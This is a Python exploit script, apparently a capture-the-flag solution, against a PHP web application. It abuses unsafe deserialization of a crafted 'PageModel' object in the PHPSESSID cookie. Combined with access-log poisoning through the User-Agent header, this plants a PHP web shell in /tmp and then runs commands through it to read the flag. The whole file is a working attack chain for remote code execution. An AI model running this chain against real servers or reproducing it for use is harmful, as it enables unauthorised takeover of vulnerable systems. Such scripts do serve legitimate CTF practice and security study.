#!/usr/bin/python3

from base64 import b64encode as b64
import requests 
import sys

def b64str(serialized_str):
    return b64(serialized_str.encode('utf-8')).decode('utf-8')

if len(sys.argv) < 3:
    print("Usage {} <IP> <PORT>".format(sys.argv[0]))
    exit()
    
host, port = sys.argv[1],sys.argv[2]
shell_file, log_file = '/tmp/Model/a.php', '/var/log/nginx/access.log'

#Inject PHP code into access.log
php_shell_cmd = f'mkdir /tmp/Model; echo \'<?php echo system($_GET[cmd]) ?>\' > {shell_file}'

#Create a malformed, serialized PHP object that will point to a file we own in /tmp/Model/a.php
serialized_php_obj = 'O:9:"PageModel":1:{{s:4:"file";s:{}:"{}";}}'.format(len(log_file),log_file)
b64_obj = b64str(serialized_php_obj)
b64_cmd = b64str(php_shell_cmd)

log_php_poison = f'<?php system(base64_decode(\'{b64_cmd}\'));?>'

#First shot: inject PHP code into the access.log file
res = requests.get(f'http://{host}:{port}/index.php', headers = { "User-Agent": log_php_poison , "Connection":"close"} , cookies = { "PHPSESSID": b64_obj } )
#Second shot: execute PHP code we injected
res = requests.get(f'http://{host}:{port}/index.php', headers = { "User-Agent": log_php_poison , "Connection":"close"}, cookies = { "PHPSESSID": b64_obj } )

serialized_str = 'O:9:"PageModel":1:{{s:4:"file";s:{}:"{}";}}'.format(len(shell_file),shell_file)
serialized_php_obj = b64str(serialized_str)

shell_res = requests.get(f'http://{host}:{port}/a?cmd=cat+`ls+/flag*`', cookies = { "PHPSESSID": serialized_php_obj , "Connection":"close"} )
print(shell_res.content)

